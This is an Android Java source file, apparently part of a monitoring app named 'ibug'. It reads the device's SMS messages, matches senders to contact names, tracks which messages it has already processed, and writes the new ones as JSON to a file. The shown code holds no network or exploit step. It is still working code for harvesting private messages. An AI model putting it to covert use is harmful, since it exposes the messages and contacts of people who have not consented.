package com.ibug.sms;

import android.util.Log;
import android.net.Uri;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.content.ContentResolver;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;

import java.io.FileWriter;
import static com.ibug.misc.Utils.Tag;
import com.ibug.IAnnotations.AbstractMethod;
import com.ibug.IAnnotations.Constructor;
import com.ibug.IAnnotations.Interface;
import com.ibug.IAnnotations.StartMethod;
import static com.ibug.misc.Utils.appDateTimeFormat;
import org.apache.commons.collections4.map.ListOrderedMap;


public abstract class SmsTask extends SmsType {

    @AbstractMethod
    public abstract int getType();

    @AbstractMethod
    public abstract String writeToLocation();

    @AbstractMethod
    public abstract void lastMessageKey(String value);

    @AbstractMethod
    public abstract String lastProcessedMessage(Context context);

    @Constructor
    public SmsTask(Context _context){
        context = _context;
        collector = new ListOrderedMap<>();
        gson = new GsonBuilder().setPrettyPrinting().create();
    }

    @Interface
    public interface FinishedTaskListener {
        void finish() throws Exception;
    }

    @StartMethod
    public void execute(FinishedTaskListener taskListener) {
        try {
            collector.clear(); // clear collections
            Cursor cursor = getCursor();
            if(cursor.getCount() > 0) {
                if(contentFilter(cursor)) {
                    // save last message key read
                    lastMessageKey(collector.get(0));
                    // write messages to file
                    fileWriter();

                    if(taskListener != null) taskListener.finish();
                    Log.d(Tag, "SMS task complete...");
                }

            }

        } catch(Exception ex) { Log.d(Tag, String.valueOf(ex));}

    }

    private void fileWriter() throws Exception {
        FileWriter writer = new FileWriter( writeToLocation(), false );
        writer.write( gson.toJson(collector.valueList()) );
        writer.close();
    }

    private Cursor getCursor() throws Exception {
        ContentResolver contentResolver = context.getContentResolver();
        return contentResolver.query(smsURI, projection, selection, selectionArgs, sortOrder );
    }

    private String contactName(String address) throws Exception {
        String contactName = "No name";
        ContentResolver contentResolver = context.getContentResolver();
        String[ ] queryCollections = new String[]{ContactsContract.Data.DISPLAY_NAME};
        Uri uri = Uri.withAppendedPath( ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address) );
        Cursor cursor = contentResolver.query(uri, queryCollections, selection, selectionArgs, sortOrder );
        if( cursor.moveToFirst() ) contactName = cursor.getString(0 );

        cursor.close();

        return contactName;
    }

    private JsonObject jsonObject(int type, String... values) throws Exception {
        String contactName = contactName(values[0]); // get contact name using address
        String messageDateTime = appDateTimeFormat(Long.parseLong(values[2])); // format Timestamp
        JsonObject gsonObject = new JsonObject();
        gsonObject.addProperty("messageName", contactName);
        gsonObject.addProperty("messageBody", values[1] );
        gsonObject.addProperty("messageType", get(type) );
        gsonObject.addProperty("messageAddress", values[0] );
        gsonObject.addProperty("messageDateTime", messageDateTime );

        return gsonObject;
    }

    private boolean contentFilter(Cursor cursor) throws Exception {
        // get column index
        int columnType = cursor.getColumnIndex(type);
        int columnBody = cursor.getColumnIndex(body);
        int columnAddress = cursor.getColumnIndex(address);
        int columnDateTime = cursor.getColumnIndex(dateTime);
        String last_message = lastProcessedMessage(context);

        while( cursor.moveToNext() ) {
            // get cell content
            String messageBody = cursor.getString(columnBody);
            String messageAddress = cursor.getString(columnAddress);
            String messageDateTime = cursor.getString(columnDateTime);
            int _type = Integer.parseInt(cursor.getString(columnType));

            if (_type != getType() && getType() != 0 ) continue;
            // check if this message had been processed before
            if (messageDateTime.equals(last_message)) break;
            // add messages to JsonObject
            collector.put(messageDateTime, jsonObject(_type, messageAddress, messageBody, messageDateTime));

        }
        cursor.close();

        return !collector.isEmpty();
    }


    private final String type = "type";
    private final String body = "body";
    private final String dateTime = "date";
    private final String address = "address";
    private final Uri smsURI = Uri.parse("content://sms");
    private final ListOrderedMap<String, JsonObject> collector;
    private final String[] selectionArgs = null;
    private final String[] projection = null;
    private final String selection = null;
    private final String sortOrder = null;
    private final Context context;
    private final Gson gson;

}
